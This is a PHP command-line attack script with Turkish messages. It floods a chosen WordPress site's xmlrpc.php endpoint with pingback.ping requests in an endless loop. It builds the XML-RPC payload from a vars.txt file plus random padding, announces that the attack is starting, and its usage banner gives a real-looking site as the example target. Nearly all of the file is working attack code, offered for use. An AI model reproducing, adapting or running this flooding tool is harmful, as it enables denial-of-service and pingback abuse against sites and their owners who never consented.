<?php
function Gonder_POST($veri,$site)
{
	$cikti = "";
	$d = curl_init();
	curl_setopt($d,CURLOPT_URL,$site);
	curl_setopt($d,CURLOPT_POST,1);
	curl_setopt($d,CURLOPT_USERAGENT,"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.8.1.13) Gecko/20080311 Firefox/2.0.0.13");
	curl_setopt($d,CURLOPT_POSTFIELDS,$veri);
	curl_setopt($d,CURLOPT_RETURNTRANSFER,true);
	$cikti = curl_exec($d);
	return $cikti;
}
function XmlOlustur($veri)
{
	$rndstr = "QWERTYUIOPASDFGHJKLZXCVBNM";
	$ab = "";
	for($cc = 0;$cc <= 250;$cc++)
	{
		$ab .= $rndstr[rand(0,strlen($rndstr)-1)];
	}
	return "<?xml version='1.0' ?>\r\n<methodCall>\r\n<methodName>pingback.ping</methodName>\r\n<params>\r\n<param><value><string>".$veri."</string></value></param>\r\n<param><value><string>".$ab."</string></value></param>\r\n</params>\r\n</methodCall>";
}

function dosyaOku($yol)
{
	$f = fopen($yol,"r");
	$cc = "";
	while(!feof($f))
	{
		$cc .= fread($f,1024);
	}
	fclose($f);
	return $cc;
}
function SiteCek($site)
{
	$cikti = "";
	$d = curl_init();
	curl_setopt($d,CURLOPT_URL,$site);
	curl_setopt($d,CURLOPT_RETURNTRANSFER,true);
	$cikti = curl_exec($d);
	return $cikti;
}
function SiteKontrol($site)
{
	if(SiteCek($site) != "")
	{
		return true;
	}
	else	
	{
		return false;
	}
	
}

if($argc == 2)
{
    $site = $argv[1];
	if(!SiteKontrol($site))
	{
		echo "[-] Site Gecerli Degil !!!!\r\n";
		echo "[-] Lutfen Gecerli Site Giriniz\r\n";
	}
	else
	{
		if(!file_exists("vars.txt"))
		{
			echo "[-] vars.txt isimli Dosya Yok Lutfen vars.txz isimli Dosya Olusturun\r\n";
		}
		else
		{
			echo "[+] Site Gecerli\r\n";
			echo "[+] vars.txt isimli dosya var.\r\n";
			echo "----------------------------------------\r\n";
			echo "[+] Hedefsite Belirlendi : ".$site."\r\n";
			echo "[+] Saldiriya Birazdan Basliyacak...\r\n";
			echo "--------------------------------------------\r\n";
			echo "[+] \"vars.txt\" isimli dosya okunuyor..\r\n";
			$veri11 = dosyaOku("vars.txt");
			echo "[+] \"vars.txt\" isimli dosya okundu..\r\n";
			echo "[+] Rastgele xml verileri olusturuluyor..\r\n";
			$veri = XmlOlustur($veri11);
			echo "[+] Rastgele xml verileri Olusturuldu..\r\n";
			echo "[+] Saldiriya Baslaniyor\r\n";
			echo "Saldiriyi Durdurmak icin CTRL+C Basabilirsiniz.....\r\n";
			while(true)
			{
				echo ".";
				Gonder_POST($veri,$site."/xmlrpc.php");
			}
		}
	}
}
else
{
	echo "
	########################################################
	#  Coded By Reqon                                 #
	#                                                      #
	#  Kullanim :                                          #
	# php ".$argv[0]." http://www.hedefwordpresssite.com/ #
	# Ornek :                                              #
	# php ".$argv[0]." http://easycamp.co.il/             #
	# Gibidir.                                             #
	########################################################
	";
}

?>
